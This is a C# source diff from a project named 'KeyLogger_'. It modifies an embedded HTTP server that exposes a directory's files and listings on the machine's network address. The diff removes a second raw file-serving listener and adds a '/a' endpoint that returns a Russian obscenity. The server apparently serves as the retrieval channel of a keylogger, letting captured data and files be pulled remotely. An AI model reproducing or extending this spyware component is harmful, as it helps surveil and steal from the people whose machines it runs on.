@@ -93,7 +93,6 @@ namespace KeyLogger_
         private Thread _serverThread;
         private string _rootDirectory;
         private HttpListener _listener;
-        private HttpListener _listener2;
         private int _port;
 
         public int Port
@@ -102,20 +101,11 @@ namespace KeyLogger_
             private set { }
         }
 
-        /// <summary>
-        /// Construct server with given port.
-        /// </summary>
-        /// <param name="path">Directory path to serve.</param>
-        /// <param name="port">Port of the server.</param>
         public SimpleHTTPServer(string path, int port)
         {
             this.Initialize(path, port);
         }
 
-        /// <summary>
-        /// Construct server with suitable port.
-        /// </summary>
-        /// <param name="path">Directory path to serve.</param>
         public SimpleHTTPServer(string path)
         {
             //get an empty port
@@ -127,20 +117,17 @@ namespace KeyLogger_
             this.Initialize(path, port);
         }
 
-        /// <summary>
-        /// Stop server and dispose all functions.
-        /// </summary>
         public void Stop()
         {
             _serverThread.Abort();
-            _t2.Abort();
             _listener.Stop();
-            _listener2.Stop();
         }
 
         private void Listen()
         {
             _listener = new HttpListener();
+            _listener.Prefixes.Add($"http://{_currentAddress}:{_port.ToString()}/a");
+            _listener.Prefixes.Add($"http://127.0.0.1:{_port.ToString()}/a");
             _listener.Prefixes.Add($"http://{_currentAddress}:{_port.ToString()}/");
             _listener.Prefixes.Add($"http://127.0.0.1:{_port.ToString()}/");
             _listener.Start();
@@ -149,6 +136,13 @@ namespace KeyLogger_
                 try
                 {
                     HttpListenerContext context = _listener.GetContext();
+                    if (context.Request.Url.ToString().EndsWith("/a"))
+                    {
+                        context.Response.StatusCode = 204;
+                        byte[] x = System.Text.Encoding.Default.GetBytes("HUI PIZDA");
+                        context.Response.OutputStream.Write(x, 0, x.Length);
+                        continue;
+                    }
                     Process(context);
                 }
                 catch (Exception ex)
@@ -157,25 +151,7 @@ namespace KeyLogger_
                 }
             }
         }
-        private void Listen2()
-        {
-            _listener2 = new HttpListener();
-            _listener2.Prefixes.Add($"http://{_currentAddress}:{(_port + 1).ToString()}/");
-            _listener2.Prefixes.Add($"http://127.0.0.1:{(_port + 1).ToString()}/");
-            _listener2.Start();
-            while (true)
-            {
-                try
-                {
-                    HttpListenerContext context = _listener2.GetContext();
-                    Process2(context);
-                }
-                catch (Exception ex)
-                {
 
-                }
-            }
-        }
         private String _currentAddress = "";
         private void _InitAddr()
         {
@@ -234,6 +210,7 @@ namespace KeyLogger_
             if (File.Exists(Path.Combine(_rootDirectory, filename)))
             {
                 //If it's file, we'll return its contents. Now do nothing
+                
             }
             else if (Directory.Exists(Path.Combine(_rootDirectory, filename)))
             {
@@ -291,109 +268,7 @@ namespace KeyLogger_
 
             context.Response.OutputStream.Close();
         }
-        private string DirectoryList2(String directory, String rel)
-        {
-            String html = "";
-            bool _isRoot = false;
-            if (String.IsNullOrWhiteSpace(rel))
-            {
-                rel = "/";
-                _isRoot = true;
-            }
-            else if (rel.Trim(" \r\n".ToCharArray()) == "/")
-            {
-                _isRoot = true;
-            }
-            else if (rel.StartsWith("/"))
-            {
-
-            }
-            else
-            {
-                rel = "/" + rel;
-            }
-            if (!_isRoot)
-            {
-                html += "dir:..\r\n";
-            }
-            foreach (var ci in Directory.EnumerateDirectories(directory))
-            {
-                DirectoryInfo di = new DirectoryInfo(ci);
-                html += $"dir:{di.Name}\r\n";
-            }
-            foreach (var ci in Directory.EnumerateFiles(directory))
-            {
-                FileInfo fi = new FileInfo(ci);
-                html += $"file:{fi.Name}\r\n";
-            }
-            return html;
-        }
-        private void Process2(HttpListenerContext context)
-        {
-            //Raw connection
-            string filename = context.Request.Url.AbsolutePath;
-            filename = filename.Substring(1);
-            if (File.Exists(Path.Combine(_rootDirectory, filename)))
-            {
-                //If it's file, we'll return its contents. Now do nothing
-            }
-            else if (Directory.Exists(Path.Combine(_rootDirectory, filename)))
-            {
-                //Directory listing
-                File.Delete("__temp_dlist_.html");
-                File.WriteAllText("__temp_dlist_.html", DirectoryList2(Path.Combine(_rootDirectory, filename), filename));
-                filename = "__temp_dlist_.html";
-            }
-            if (string.IsNullOrEmpty(filename))
-            {
-                foreach (string indexFile in _indexFiles)
-                {
-                    if (File.Exists(Path.Combine(_rootDirectory, indexFile)))
-                    {
-                        filename = indexFile;
-                        break;
-                    }
-                }
-            }
-
-            filename = Path.Combine(_rootDirectory, filename);
-
-            if (File.Exists(filename))
-            {
-                try
-                {
-                    Stream input = new FileStream(filename, FileMode.Open);
-
-                    //Adding permanent http response headers
-                    string mime;
-                    context.Response.ContentType = "application/octet-stream";
-                    context.Response.ContentLength64 = input.Length;
-                    context.Response.AddHeader("Date", DateTime.Now.ToString("r"));
-                    context.Response.AddHeader("Last-Modified", System.IO.File.GetLastWriteTime(filename).ToString("r"));
-
-                    byte[] buffer = new byte[1024 * 16];
-                    int nbytes;
-                    while ((nbytes = input.Read(buffer, 0, buffer.Length)) > 0)
-                        context.Response.OutputStream.Write(buffer, 0, nbytes);
-                    input.Close();
-
-                    context.Response.StatusCode = (int)HttpStatusCode.OK;
-                    context.Response.OutputStream.Flush();
-                }
-                catch (Exception ex)
-                {
-                    context.Response.StatusCode = (int)HttpStatusCode.InternalServerError;
-                }
-
-            }
-            else
-            {
-                context.Response.StatusCode = (int)HttpStatusCode.NotFound;
-            }
-
-            context.Response.OutputStream.Close();
-        }
-        Thread _t2;
+        
         private void Initialize(string path, int port)
         {
             this._rootDirectory = path;
@@ -401,8 +276,6 @@ namespace KeyLogger_
             _InitAddr();
             _serverThread = new Thread(this.Listen);
             _serverThread.Start();
-            _t2 = new Thread(Listen2);
-            _t2.Start();
         }
 
         
